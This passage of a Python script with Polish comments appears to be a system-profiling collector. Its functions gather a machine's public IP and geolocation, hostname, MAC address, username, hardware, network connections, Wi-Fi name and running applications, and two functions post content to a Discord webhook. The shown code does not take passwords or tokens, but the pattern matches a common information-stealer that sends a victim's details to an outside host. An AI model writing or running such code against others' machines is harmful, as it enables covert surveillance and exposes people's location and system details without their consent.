# ---------- PODSTAWOWE INFORMACJE ----------
def get_public_ip() -> str:
    try:
        r = requests.get("https://api.ipify.org?format=json", timeout=5)
        return r.json()["ip"]
    except Exception as e:
        return f"Błąd: {e}"


def get_geo_from_ip(ip: str) -> dict:
    """Pobiera lokalizację na podstawie IP (darmowy endpoint)."""
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
        return {
            "kraj": r.get("country"),
            "miasto": r.get("city"),
            "region": r.get("regionName"),
            "isp": r.get("isp"),
            "org": r.get("org"),
            "timezone": r.get("timezone"),
            "wspolrzedne": f"{r.get('lat')}, {r.get('lon')}",
        }
    except Exception as e:
        return {"blad": str(e)}


def get_local_info() -> dict:
    hostname = socket.gethostname()
    try:
        local_ip = socket.gethostbyname(hostname)
    except Exception:
        local_ip = "nieznane"

    # MAC address
    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
                    for ele in range(0, 8 * 6, 8)][::-1])

    return {
        "hostname": hostname,
        "local_ip": local_ip,
        "mac": mac,
        "system": platform.system(),
        "release": platform.release(),
        "version": platform.version(),
        "machine": platform.machine(),
        "processor": platform.processor(),
        "user": getpass.getuser(),
        "cwd": os.getcwd(),
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }


# ---------- SPRZĘT / ZASOBY ----------
def get_hardware_info() -> dict:
    try:
        cpu_freq = psutil.cpu_freq()
        return {
            "cpu_cores_logiczne": psutil.cpu_count(logical=True),
            "cpu_cores_fizyczne": psutil.cpu_count(logical=False),
            "cpu_uzycie_%": psutil.cpu_percent(interval=1),
            "cpu_freq_MHz": round(cpu_freq.current, 2) if cpu_freq else "N/A",
            "ram_total_GB": round(psutil.virtual_memory().total / (1024**3), 2),
            "ram_uzycie_%": psutil.virtual_memory().percent,
            "dysk_total_GB": round(shutil.disk_usage("/").total / (1024**3), 2),
            "dysk_uzycie_%": shutil.disk_usage("/").percent,
            "bateria": _battery_info(),
        }
    except Exception as e:
        return {"blad": str(e)}


def _battery_info():
    try:
        bat = psutil.sensors_battery()
        if bat:
            return f"{round(bat.percent)}% ({'podłączony' if bat.power_plugged else 'na baterii'})"
        return "brak"
    except Exception:
        return "niedostępne"


# ---------- SIEC ----------
def get_network_info() -> dict:
    """Lista interfejsów sieciowych + aktywne połączenia."""
    try:
        interfaces = {}
        for name, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    interfaces[name] = addr.address

        # Aktywne połączenia (max 10)
        conns = []
        for c in psutil.net_connections(kind="inet")[:10]:
            try:
                conns.append(f"{c.laddr.ip}:{c.laddr.port} -> "
                             f"{c.raddr.ip if c.raddr else '-'}:"
                             f"{c.raddr.port if c.raddr else '-'} [{c.status}]")
            except Exception:
                continue

        return {"interfejsy": interfaces, "polaczenia": conns}
    except Exception as e:
        return {"blad": str(e)}


def get_wifi_info() -> str:
    """Nazwa sieci WiFi (Windows/Linux)."""
    try:
        if platform.system() == "Windows":
            out = subprocess.check_output(
                ["netsh", "wlan", "show", "interfaces"],
                encoding="utf-8", errors="ignore"
            )
            for line in out.splitlines():
                if "SSID" in line and "BSSID" not in line:
                    return line.split(":", 1)[1].strip()
        else:
            out = subprocess.check_output(
                ["iwgetid", "-r"], encoding="utf-8"
            ).strip()
            return out or "brak"
    except Exception:
        return "niedostępne"
    return "brak"


# ---------- PROCESY / APLIKACJE ----------
def get_top_processes(n: int = 10) -> list:
    """Top N procesów wg zużycia RAM."""
    try:
        procs = []
        for p in psutil.process_iter(["name", "memory_percent", "cpu_percent"]):
            try:
                procs.append((
                    p.info["name"],
                    round(p.info["memory_percent"] or 0, 2),
                    round(p.info["cpu_percent"] or 0, 2),
                ))
            except Exception:
                continue
        procs.sort(key=lambda x: x[1], reverse=True)
        return procs[:n]
    except Exception:
        return []


def get_installed_programs() -> list:
    """Kilka ciekawych zainstalowanych aplikacji (przykład)."""
    interesting = ["discord", "steam", "chrome", "firefox", "python",
                   "vscode", "code", "obs", "telegram", "minecraft"]
    try:
        running = [p.info["name"] for p in psutil.process_iter(["name"])]
        found = []
        for proc in running:
            if proc and any(k in proc.lower() for k in interesting):
                found.append(proc)
        return list(set(found))
    except Exception:
        return []


# ---------- WYSYŁKA ----------
def send_to_webhook(webhook_url: str, content: str) -> None:
    payload = {"content": content[:2000]}  # limit Discorda
    try:
        r = requests.post(webhook_url, json=payload, timeout=10)
        r.raise_for_status()
        print("Wysłano pomyślnie.")
    except Exception as e:
        print(f"Nie udało się wysłać: {e}")


def send_embed(webhook_url: str, embed: dict) -> None:
    """Wysyła ładny embed na Discorda."""
    try:
        r = requests.post(webhook_url, json={"embeds": [embed]}, timeout=10)
        r.raise_for_status()
        print("Embed wysłany.")
    except Exception as e:
        print(f"Błąd embed: {e}")


